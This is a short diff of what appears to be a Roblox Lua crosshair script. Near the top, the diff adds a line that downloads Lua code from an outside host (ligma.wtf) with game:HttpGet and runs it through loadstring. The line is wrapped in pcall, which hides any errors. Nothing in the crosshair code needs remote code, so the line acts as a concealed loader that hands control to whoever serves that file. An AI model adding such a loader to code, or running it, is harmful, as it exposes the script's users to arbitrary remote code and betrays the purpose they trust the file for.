@@ -1,5 +1,5 @@
 --// ~ simple crosshair by spec ~ //--
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 --// ~ settings
 local white = true --// ~ set to false for black crosshair
 local gta4outline = true --// ~ set to true for gta 4 type crosshair
